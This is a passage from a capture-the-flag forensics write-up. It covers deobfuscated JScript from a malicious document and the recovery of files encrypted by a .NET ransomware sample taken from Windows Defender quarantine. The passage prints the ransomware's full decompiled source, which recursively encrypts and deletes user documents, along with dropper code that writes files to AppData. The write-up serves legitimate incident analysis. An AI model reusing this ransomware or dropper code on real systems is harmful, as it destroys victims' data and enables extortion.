        return ""
    }
}

function poBP(QQDq) {
    var HiEg = "0123456789ABCDEF";
    var L9qj = HiEg.substr(QQDq & 15, 1);
    while (QQDq > 15) {
        QQDq >>>= 4;
        L9qj = HiEg.substr(QQDq & 15, 1) + L9qj
    }
    return L9qj
}

function JbVq(x4hL) {
    return parseInt(x4hL, 16)
}

function l9BJ(Wid9) {
    var wXgO = [];
    var pV8q = Wid9.length;
    for (var i = 0; i < pV8q; i++) {
        var yWql = Wid9.charCodeAt(i);
        if (yWql >= 128) {
            var h = lW6t["" + poBP(yWql)];
            yWql = JbVq(h)
        }
        wXgO.push(yWql)
    }
    return wXgO
}

function Trql(EQ4R, K5X0) {
    var gfjd = WScript.CreateObject("ADODB.Stream");
    gfjd.type = 2;
    gfjd.Charset = "iso-8859-1";
    gfjd.Open();
    gfjd.WriteText(EQ4R);
    gfjd.Flush();
    gfjd.Position = 0;
    gfjd.SaveToFile(K5X0, 2);
    gfjd.close()
}

function Jp6A(KgOm) {
    icVh = "c:\\Users\\" + Vxiu + "\\AppData\\Local\\Microsoft\\Windows\\";
    if (!Z6HQ.FOLDEREXISTS(icVh)) icVh = "c:\\Users\\" + Vxiu + "\\AppData\\Local\\Temp\\";
    if (!Z6HQ.FOLDEREXISTS(icVh)) icVh = "c:\\Documents and Settings\\" + Vxiu + "\\Application Data\\Microsoft\\Windows\\";
    return icVh
}

function t7Nl(npmb, AIsp) {
    var M4tj = [];
    var KRYr = 0;
    var FPIW;
    var wXgO = "";
    for (var i = 0; i < 256; i++) {
        M4tj[i] = i
    }
    for (var i = 0; i < 256; i++) {
        KRYr = (KRYr + M4tj[i] + npmb.charCodeAt(i % npmb.length)) % 256;
        FPIW = M4tj[i];
        M4tj[i] = M4tj[KRYr];
        M4tj[KRYr] = FPIW
    }
    var i = 0;
    var KRYr = 0;
    for (var y = 0; y < AIsp.length; y++) {
        i = (i + 1) % 256;
        KRYr = (KRYr + M4tj[i]) % 256;
        FPIW = M4tj[i];
        M4tj[i] = M4tj[KRYr];
        M4tj[KRYr] = FPIW;
        wXgO += String.fromCharCode(AIsp[y] ^ M4tj[(M4tj[i] + M4tj[KRYr]) % 256])
    }
    return wXgO
}
```
</details>

Flag: `S47T.SETREQUESTHEADER("Cookie:", "flag=SFRCe200bGQwY3NfNHIzX2czdHQxbmdfVHIxY2tpMTNyfQo=");`
```
└─$ echo SFRCe200bGQwY3NfNHIzX2czdHQxbmdfVHIxY2tpMTNyfQo= | base64 --decode
HTB{m4ld0cs_4r3_g3tt1ng_Tr1cki13r}
```

## Task 9: Confinement
Question: "Our clan's network has been infected by a cunning ransomware attack, encrypting irreplaceable data essential for our relentless rivalry with other factions. With no backups to fall back on, we find ourselves at the mercy of unseen adversaries, our fate uncertain. Your expertise is the beacon of hope we desperately need to unlock these encrypted files and reclaim our destiny in The Fray.
Note: The valuable data is stored under \Documents\Work"

Flag: `HTB{2_f34r_1s_4_ch01ce_322720914448bf9831435690c5835634}`

We are given AD1 image file to analyze. Analyzing it via FTK Imager, we can navigate to `C:\Users\tommyxiaomi\Documents\Work\Ncomp\` to find an important file being encrypted with a ransomware note being left behind. However, it seems that the malware was probably removed or hidden since it could not be found in common locations like Downloads, Temp and Desktop.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/962520b3-85a1-41e9-bcf9-1857e118b4f6)

So I went to analyze the event logs using Hayabusa to get an idea of the attacker's motive and method. Filtering by `high` and `critical` levels, we can see several malwares being detected by Windows Defender with high and critical alerts. The malwares include mimikatz.exe, fscan64.exe, browser-pw-decrypt.exe and intel.exe.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/5a845c8b-44c4-4cde-9e0f-01e96cc2355e)

So my teammate @ayam suggested that the Windows Defender might have quarantined the malware. Doing some research on this, I found this [blog](https://research.nccgroup.com/2023/12/14/reverse-reveal-recover-windows-defender-quarantine-forensics/) that mentioned malicious files being stored in `C:\ProgramData\Microsoft\Windows Defender\Quarantine\ResourceData`.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/adca574e-be83-4ece-bfc5-697bcf22d918)

After that, I found this [tool](https://github.com/zam89/Windows-Defender-Quarantine-File-Decryptor) that helps in decrypting files that been quarantined by Windows Defender. Using the tool, the malwares identified in Hayabusa previously can be extracted.

```powershell
PS C:\Users\ooiro\Desktop\Windows-Defender-Quarantine-File-Decryptor-main> .\defender_file_decryptor.exe C:\Users\ooiro\Downloads\forensics_confinement\ResourceData\6A\6A5D1A3567B13E1C3F511958771FBEB9841372D1 C:\Users\ooiro\Downloads\forensics_confinement\malware\malware1

PS C:\Users\ooiro\Desktop\Windows-Defender-Quarantine-File-Decryptor-main> .\defender_file_decryptor.exe C:\Users\ooiro\Downloads\forensics_confinement\ResourceData\49\49D2DBE7E1E75C6957E7DD2D4E00EF37E77C0FCE C:\Users\ooiro\Downloads\forensics_confinement\malware\malware2

PS C:\Users\ooiro\Desktop\Windows-Defender-Quarantine-File-Decryptor-main> .\defender_file_decryptor.exe C:\Users\ooiro\Downloads\forensics_confinement\ResourceData\AE\AEB49B27BE00FB9EFCD633731DBF241AC94438B7 C:\Users\ooiro\Downloads\forensics_confinement\malware\malware3

PS C:\Users\ooiro\Desktop\Windows-Defender-Quarantine-File-Decryptor-main> .\defender_file_decryptor.exe C:\Users\ooiro\Downloads\forensics_confinement\ResourceData\B2\B23626565BF4CD28999377F1AFD351BE976443A2 C:\Users\ooiro\Downloads\forensics_confinement\malware\malware4
```

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/d6c1a8e6-1a21-4745-9c17-2d928b78d5b3)

Analyzing them on VirusTotal, it seems that `malware3` is the ransomware responsible for encrypting the files called `Encrypter.exe`. It seems that the malware .NET-based, so we can use dnSpy again to analyze its functions. Additionally, I found this [blog](https://medium.com/@rachelkesavan7/dcdcrypt-ransomware-decryptor-e8c79db0505) that did a research on this specific ransomware.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/a91b7e99-f709-458a-9c5a-df23bbf43f2b)

I am not very good at malware analysis but from analyzing important parts of the ransomware, I can try to understand how the encryption works.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/1ad984b9-c003-4e7e-a284-9fda1d852468)

TL;DR: The `Program` class initializes various components such as a Utility object and a PasswordHasher object. The program then checks if it's running on a specific machine "DESKTOP-A1L0P1U". If it is, the program generates a unique UID and creates an Alert object to probably represent as the ransomware note. Then, it initiates the encryption process for files within a specified directory using a CoreEncrypter object. Additionally, the bottom of the code shows the defined constants for email addresses, a salt value, and software name identification. However, the UID seems to be null so this might be a problem later on.

<details>
<summary>
Program class
</summary>

```c#
using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using Encrypter.Class;

namespace Encrypter
{
	// Token: 0x02000004 RID: 4
	internal class Program
	{
		// Token: 0x06000004 RID: 4
		private static void Main(string[] args)
		{
			Utility utility = new Utility();
			PasswordHasher passwordHasher = new PasswordHasher();
			if (!Dns.GetHostName().Equals("DESKTOP-A1L0P1U", StringComparison.OrdinalIgnoreCase))
			{
				return;
			}
			Program.UID = utility.GenerateUserID();
			utility.Write("\nUserID = " + Program.UID, ConsoleColor.Cyan);
			Alert alert = new Alert(Program.UID, Program.email1, Program.email2);
			Program.email = string.Concat(new string[]
			{
				Program.email1,
				" And ",
				Program.email2,
				" (send both)"
			});
			Program.coreEncrypter = new CoreEncrypter(passwordHasher.GetHashCode(Program.UID, Program.salt), alert.ValidateAlert(), Program.alertName, Program.email);
			utility.Write("\nStart ...", ConsoleColor.Red);
			Program.Enc(Environment.CurrentDirectory);
			Console.ReadKey();
		}

		// Token: 0x06000005 RID: 5
		private static List<string> Enc(string sDir)
		{
			List<string> list = new List<string>();
			foreach (string text in Directory.GetFiles(sDir))
			{
				try
				{
					string extension = Path.GetExtension(text);
					if (!text.Contains(".korp") && !text.Contains(".hta") && !text.Contains("ID.sc") && !text.Contains("desktop.ini") && !text.Contains(Program.softwareName) && (extension == ".txt" || extension == ".doc" || extension == ".docx" || extension == ".xls" || extension == ".xlsx" || extension == ".ppt" || extension == ".pptx" || extension == ".odt" || extension == ".jpg" || extension == ".png" || extension == ".csv" || extension == ".sql" || extension == ".mdb" || extension == ".sln" || extension == ".php" || extension == ".pdf" || extension == ".aspx" || extension == ".html" || extension == ".xml" || extension == ".psd" || extension == ".jpeg"))
					{
						Console.ForegroundColor = ConsoleColor.Green;
						Console.WriteLine(text);
						Console.ForegroundColor = ConsoleColor.Green;
						Program.coreEncrypter.EncryptFile(text);
					}
				}
				catch (Exception)
				{
				}
			}
			foreach (string sDir2 in Directory.GetDirectories(sDir))
			{
				try
				{
					list.AddRange(Program.Enc(sDir2));
				}
				catch (Exception)
				{
				}
			}
			return list;
		}

		// Token: 0x04000001 RID: 1
		private static string email1 = "fraycrypter@korp.com";

		// Token: 0x04000002 RID: 2
		private static string email2 = "fraydecryptsp@korp.com";

		// Token: 0x04000003 RID: 3
		public static readonly string alertName = "ULTIMATUM";

		// Token: 0x04000004 RID: 4
		private static string salt = "0f5264038205edfb1ac05fbb0e8c5e94";

		// Token: 0x04000005 RID: 5
		private static string email;

		// Token: 0x04000006 RID: 6
		private static string softwareName = "Encrypter";

		// Token: 0x04000007 RID: 7
		private static CoreEncrypter coreEncrypter = null;

		// Token: 0x04000008 RID: 8
		private static string UID = "5K7X7E6X7V2D6F";
	}
}
```
</details>

TL;DR: This `Encrypter` class handles the encryption of files using a password-based symmetric encryption scheme (RFC 2898). It initializes encryption parameters, including key derivation using the Rfc2898DeriveBytes class, and configures a RijndaelManaged object for symmetric encryption with CBC mode and ISO10126 padding. After ensuring the presence of an alert file, it proceeds to read the file content, encrypting it in chunks with the configured encryption algorithm. The encrypted data is then stored in a new file with a ".korp" extension. Cleanup tasks encompass closing file streams and managing the original file's fate based on its size.

<details>
<summary>
CoreEncrypter class
</summary>
  
```c#
using System;
using System.IO;
using System.Security.Cryptography;

namespace Encrypter.Class
{
	// Token: 0x02000006 RID: 6
	public class CoreEncrypter
	{
		// Token: 0x17000004 RID: 4
		// (get) Token: 0x06000010 RID: 16 RVA: 0x000020FA File Offset: 0x000002FA
		// (set) Token: 0x06000011 RID: 17 RVA: 0x00002102 File Offset: 0x00000302
		public string password { get; set; }

		// Token: 0x17000005 RID: 5
		// (get) Token: 0x06000012 RID: 18 RVA: 0x0000210B File Offset: 0x0000030B
		// (set) Token: 0x06000013 RID: 19 RVA: 0x00002113 File Offset: 0x00000313
		public string alert { get; set; }

		// Token: 0x17000006 RID: 6
		// (get) Token: 0x06000014 RID: 20 RVA: 0x0000211C File Offset: 0x0000031C
		// (set) Token: 0x06000015 RID: 21 RVA: 0x00002124 File Offset: 0x00000324
		public string alertName { get; set; }

		// Token: 0x17000007 RID: 7
		// (get) Token: 0x06000016 RID: 22 RVA: 0x0000212D File Offset: 0x0000032D
		// (set) Token: 0x06000017 RID: 23 RVA: 0x00002135 File Offset: 0x00000335
		public string email { get; set; }

		// Token: 0x06000018 RID: 24 RVA: 0x0000213E File Offset: 0x0000033E
		public CoreEncrypter(string password, string alert, string alertName, string email)
		{
			this.password = password;
			this.alert = alert;
			this.alertName = alertName;
			this.email = email;
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00002524 File Offset: 0x00000724
		public void EncryptFile(string file)
		{
			byte[] array = new byte[65535];
			byte[] salt = new byte[]
			{
				0,
				1,
				1,
				0,
				1,
				1,
				0,
				0
			};
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(this.password, salt, 4953);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			rijndaelManaged.Padding = PaddingMode.ISO10126;
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			FileStream fileStream = null;
			try
			{
				if (!File.Exists(Directory.GetDirectoryRoot(file) + "\\" + this.alertName + ".hta"))
				{
					File.WriteAllText(Path.GetDirectoryName(file) + "\\" + this.alertName + ".hta", this.alert);
				}
				File.WriteAllText(Path.GetDirectoryName(file) + "\\" + this.alertName + ".hta", this.alert);
			}
			catch (Exception ex)
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine(ex.Message);
				Console.ForegroundColor = ConsoleColor.Red;
			}
			try
			{
				fileStream = new FileStream(file, FileMode.Open, FileAccess.ReadWrite);
			}
			catch (Exception ex2)
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine(ex2.Message);
				Console.ForegroundColor = ConsoleColor.Red;
			}
			if (fileStream.Length < 1000000L)
			{
				string path = null;
				FileStream fileStream2 = null;
				CryptoStream cryptoStream = null;
				try
				{
					path = file + ".korp";
					fileStream2 = new FileStream(path, FileMode.Create, FileAccess.Write);
					cryptoStream = new CryptoStream(fileStream2, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
				}
				catch (Exception ex3)
				{
					Console.ForegroundColor = ConsoleColor.Red;
					Console.WriteLine(ex3.Message);
					Console.ForegroundColor = ConsoleColor.Red;
				}
				try
				{
					int num;
					do
					{
						num = fileStream.Read(array, 0, array.Length);
						if (num != 0)
						{
							cryptoStream.Write(array, 0, num);
						}
					}
					while (num != 0);
					fileStream.Close();
					cryptoStream.Close();
					fileStream2.Close();
				}
				catch (Exception ex4)
				{
					Console.ForegroundColor = ConsoleColor.Red;
					Console.WriteLine(ex4.Message);
					Console.ForegroundColor = ConsoleColor.Red;
				}
				try
				{
					File.Delete(file);
					return;
				}
				catch (Exception)
				{
					File.Delete(path);
					return;
				}
			}
			string destFileName = file + ".korp";
			try
			{
				long position = fileStream.Position;
				int num2 = fileStream.ReadByte() ^ 255;
				fileStream.Seek(position, SeekOrigin.Begin);
				fileStream.WriteByte((byte)num2);
				fileStream.Close();
				File.Move(file, destFileName);
			}
			catch (Exception ex5)
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine(ex5.Message);
				Console.ForegroundColor = ConsoleColor.Red;
			}
		}
	}
}
```
</details>

Thankfully this is a forensics challenge, not reverse engineering, so it would not be so difficult to find the decryption method. It seems that to decrypt the files, a password was required. The password is generated using both the values of the UID and salt in the `PasswordHasher` class.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/6a83c902-4271-4dde-9e08-a88efc6f3d0b)

<details>
<summary>
PasswordHasher class
</summary>

```c#
using System;
using System.Security.Cryptography;
using System.Text;

namespace Encrypter.Class
{
	// Token: 0x02000007 RID: 7
	internal class PasswordHasher
	{
		// Token: 0x0600001A RID: 26 RVA: 0x000027C8 File Offset: 0x000009C8
		public string GetSalt()
		{
			return Guid.NewGuid().ToString("N");
		}

		// Token: 0x0600001B RID: 27 RVA: 0x000027E8 File Offset: 0x000009E8
		public string Hasher(string password)
		{
			string result;
			using (SHA512CryptoServiceProvider sha512CryptoServiceProvider = new SHA512CryptoServiceProvider())
			{
				byte[] bytes = Encoding.UTF8.GetBytes(password);
				result = Convert.ToBase64String(sha512CryptoServiceProvider.ComputeHash(bytes));
			}
			return result;
		}

		// Token: 0x0600001C RID: 28 RVA: 0x00002834 File Offset: 0x00000A34
		public string GetHashCode(string password, string salt)
		{
			string password2 = password + salt;
			return this.Hasher(password2);
		}

		// Token: 0x0600001D RID: 29 RVA: 0x00002163 File Offset: 0x00000363
		public bool CheckPassword(string password, string salt, string hashedpass)
		{
			return this.GetHashCode(password, salt) == hashedpass;
		}
	}
}
```
</details>

However, the value of UID was not initialized but the salt is, so I had to find out what the UID was. Looking at the methods, the UID generation seems to be randomly generated, so at this point I was pretty confused on what I should do next.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/c69566d1-de46-4c17-ba48-732012b9bdc6)

Looking back at the `Program` class, it seems that the Alert method might have the UID somewhere with the email addresses.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/c30f93aa-1cdc-4576-9c5a-8a1b595f6cbc)

Analyzing the Alert method, it actually renamed UID to AttackID...so it was not random but it is dropped on the ransomware note. Going to the ransomware note, the UID can be found as `5K7X7E6X7V2D6F`

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/9ca3118f-6460-4368-93c9-dbc6e9595126)

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/d1704b8b-d540-4793-8a6e-853fcd0b76a5)

With the UID and salt, I can create a new script to decrypt the file by slightly modifying the `CoreEncrypter` class from the ransomware.

```c#
using System;
using System.Text;
using System.Security.Cryptography;
using System.IO;

namespace ConsoleApp1
{
    class Program
    {
        public static string Hasher(string password)
        {
            string result;
            using (SHA512CryptoServiceProvider sha512CryptoServiceProvider = new SHA512CryptoServiceProvider())
            {
                byte[] bytes = Encoding.UTF8.GetBytes(password);
                result = Convert.ToBase64String(sha512CryptoServiceProvider.ComputeHash(bytes));
            }
            return result;
        }
        public static string GetHashCode(string password, string salt)
        {
            string password2 = password + salt;
            return Hasher(password2);
        }
        static void Main(string[] args)
        {
            String UID = "5K7X7E6X7V2D6F";
            String _salt = "0f5264038205edfb1ac05fbb0e8c5e94";
            String password = GetHashCode(UID, _salt);
            String file = "C:\\Users\\ooiro\\Downloads\\forensics_confinement\\Work\\Ncomp\\Applicants_info.xlsx.korp";

			byte[] array = new byte[65535];
			byte[] salt = new byte[] { 0, 1, 1, 0, 1, 1, 0, 0 };
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, salt, 4953);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			rijndaelManaged.Padding = PaddingMode.ISO10126;
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			FileStream fileStream = null;
			
			try
			{
				fileStream = new FileStream(file, FileMode.Open, FileAccess.ReadWrite);
			}
			catch (Exception ex2)
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine(ex2.Message);
				Console.ForegroundColor = ConsoleColor.Red;
			}
			if (fileStream.Length < 1000000L)
			{
				string path = null;
				FileStream fileStream2 = null;
				CryptoStream cryptoStream = null;
				try
				{
					path = file.Replace(".korp", "");
					fileStream2 = new FileStream(path, FileMode.Create, FileAccess.Write);
					cryptoStream = new CryptoStream(fileStream2, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
				}
				catch (Exception ex3)
				{
					Console.ForegroundColor = ConsoleColor.Red;
					Console.WriteLine(ex3.Message);
					Console.ForegroundColor = ConsoleColor.Red;
				}
				try
				{
					int num;
					do
					{
						num = fileStream.Read(array, 0, array.Length);
						if (num != 0)
						{
							cryptoStream.Write(array, 0, num);
						}
					}
					while (num != 0);
					fileStream.Close();
					cryptoStream.Close();
					fileStream2.Close();
				}
				catch (Exception ex4)
				{
					Console.ForegroundColor = ConsoleColor.Red;
					Console.WriteLine(ex4.Message);
					Console.ForegroundColor = ConsoleColor.Red;
				}
				try
				{
					File.Delete(file);
					return;
				}
				catch (Exception)
				{
					File.Delete(path);
					return;
				}
			}
			string destFileName = file.Replace(".korp", "");
			try
			{
				long position = fileStream.Position;
				int num2 = fileStream.ReadByte() ^ 255;
				fileStream.Seek(position, SeekOrigin.Begin);
				fileStream.WriteByte((byte)num2);
				fileStream.Close();
				File.Move(file, destFileName);
			}
			catch (Exception ex5)
			{
				Console.ForegroundColor = ConsoleColor.Red;
				Console.WriteLine(ex5.Message);
				Console.ForegroundColor = ConsoleColor.Red;
			}

		}
    }
}
```

Running the script, the file is succesfully decrypted with the flag within it.

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/c8c15700-dfc2-4674-8b16-ebab3be24d86)

![image](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/d08bb9c8-e83e-46fa-8a6a-9b2337c47f03)

## Task 10: Oblique Final
Question: As the days for the final round of the game, draw near, rumors are beginning to spread that one faction in particular has rigged the final! In the meeting with your team, you discuss that if the game is indeed rigged, then there can be no victory here... Suddenly, one team player barged in carrying a Windows Laptop and said they found it in some back room in the game Architects' building just after the faction had left! As soon as you open it up it turns off due to a low battery! You explain to the rest of your team that the Legionnaires despise anything unethical and if you expose them and go to them with your evidence in hand, then you surely end up being their favorite up-and-coming faction. "Are you Ready To Run with the Wolves?!"

Flag: ``

Can't solve this challenge, will wait for writeups and try it on my own later.

# Closing thoughts
> Credits to @desutruction for this funny meme

![milforensics](https://github.com/warlocksmurf/onlinectf-writeups/assets/121353711/57e7af65-397a-41b9-ab20-7251ca501ff9)
